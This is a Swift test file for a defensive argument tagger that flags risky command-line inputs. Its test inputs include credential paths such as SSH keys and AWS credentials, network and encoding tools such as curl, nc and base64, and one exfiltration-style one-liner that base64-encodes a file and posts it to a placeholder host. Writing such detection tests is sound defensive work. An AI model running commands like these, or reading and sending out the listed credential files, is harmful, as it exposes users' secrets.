import Testing
@testable import GatekeepersWard

/// Tests for suspicious-argument tagging.
struct RiskTaggerTests {
    @Test("The README example flags the .env target and the secret search term")
    func readmeExample() {
        let tags = RiskTagger.tags(for: ["rg", "AWS_SECRET", "/Users/dev/Documents/production.env"])
        #expect(tags.map(\.argumentIndex) == [1, 2])
        #expect(tags.map(\.category) == [.secretPath, .credentialFile])
    }

    @Test("Credential files are flagged case-insensitively",
          arguments: ["~/.ssh/id_rsa", "KEY.PEM", "~/.aws/credentials", "cert.p12", "id_ed25519.pub"])
    func credentialFiles(argument: String) {
        #expect(RiskTagger.isRisky(argument))
    }

    @Test("Network and encoding tools are flagged as program names",
          arguments: ["curl", "/usr/bin/curl", "nc", "/opt/homebrew/bin/wget", "base64", "xxd"])
    func toolsAsPrograms(argument: String) {
        #expect(RiskTagger.isRisky(argument))
    }

    @Test("Tools inside a shell one-liner are flagged")
    func toolsInsideShellCommand() {
        let tags = RiskTagger.tags(for: ["/bin/zsh", "-c", "cat notes.txt | base64 | curl -d @- example.com"])
        #expect(tags.count == 1)
        #expect(tags.first?.argumentIndex == 2)
        #expect(tags.first?.category == .encoding)
    }

    @Test("Short tool names do not fire inside ordinary words",
          arguments: ["sync", "since", "rsync", "function.swift", "/usr/bin/grep", "README.md", "-n"])
    func noFalsePositivesOnWords(argument: String) {
        #expect(!RiskTagger.isRisky(argument))
    }

    @Test("An ordinary search yields no tags")
    func harmlessCommand() {
        #expect(RiskTagger.tags(for: ["rg", "TODO", "Sources/"]).isEmpty)
    }
}
